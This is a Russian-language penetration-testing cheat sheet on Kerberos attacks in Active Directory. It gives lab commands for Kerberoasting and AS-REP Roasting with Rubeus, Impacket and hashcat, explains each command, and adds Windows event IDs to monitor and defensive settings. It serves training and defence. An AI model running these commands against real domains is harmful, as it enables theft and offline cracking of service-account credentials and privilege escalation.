# Kerberos Attack

## 🎯 Цель атаки
Эксплуатировать слабые места протокола Kerberos для получения доступа к учётным записям и повышения привилегий в домене Active Directory.

## 📋 Описание
Kerberos — основной протокол аутентификации в AD. Атаки на него включают Kerberoasting, AS-REP Roasting, Pass-the-Ticket и другие техники.  
Главная цель атакующего — получить TGS или TGT и использовать их для входа в систему без знания пароля в открытом виде.

## ⚠ Условия эксплуатации
- Доступ к контроллеру домена по портам Kerberos (88/tcp, 88/udp).
- Учётная запись в домене (для некоторых атак).
- Уязвимые настройки SPN-аккаунтов (слабые пароли сервисов).

## 🔹 Пошаговое проведение атаки (лаборатория)
> ⚠ Выполнять только в изолированной тестовой среде!

### Kerberoasting
1. Получить список сервисных SPN-аккаунтов:
```powershell
setspn -Q */*
```
2. Запросить TGS для этих SPN (пример с Rubeus):
```powershell
Rubeus.exe kerberoast /user:targetuser /rc4 /nowrap
```
3. Взломать полученный хэш оффлайн (Hashcat):
```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

### AS-REP Roasting
1. Найти учётки с флагом "Do not require Kerberos preauthentication":
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties ServicePrincipalName
```
2. Получить AS-REP ответ:
```bash
GetNPUsers.py domain.local/user -dc-ip 192.168.1.10
```

## 📊 Признаки в логах и мониторинг
- Event ID **4769** — выдача TGS (особенно множественные для разных сервисов).
- Event ID **4624** с LogonType=3/9 от необычных хостов.
- Частые ошибки Kerberos-аутентификации.

## 🛡 Меры защиты
- Сложные пароли для SPN-аккаунтов.
- Убрать флаг "DoesNotRequirePreAuth".
- Ограничить права учёток.
- Мониторить события 4769, 4624, 4771.

## 🔗 Источники
- [MITRE ATT&CK: T1558](https://attack.mitre.org/techniques/T1558/)
- [Kerberos Attacks and Defense](https://adsecurity.org/)

---

## 🔍 Разбор команд

### 1. Получение списка SPN
```powershell
setspn -Q */*
```
- **`setspn`** — утилита Windows для работы с SPN.
- **`-Q */*`** — запрос всех сервисных SPN в домене.

### 2. Kerberoasting с Rubeus
```powershell
Rubeus.exe kerberoast /user:targetuser /rc4 /nowrap
```
- **`kerberoast`** — модуль Rubeus для запроса TGS и получения их в хэш-формате.
- **`/rc4`** — тип шифрования RC4.
- **`/nowrap`** — вывод без переноса строк.

### 3. Взлом хэшей Hashcat
```bash
hashcat -m 13100 hashes.txt rockyou.txt
```
- **`-m 13100`** — Kerberos 5 TGS-REP etype 23.
- **`hashes.txt`** — файл с хэшами.
- **`rockyou.txt`** — словарь.

### 4. Поиск учёток без preauth
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties ServicePrincipalName
```
- Находит аккаунты, у которых отключена Kerberos-предаутентификация.

### 5. Получение AS-REP
```bash
GetNPUsers.py domain.local/user -dc-ip 192.168.1.10
```
- Скрипт из Impacket для получения AS-REP у уязвимых учёток.
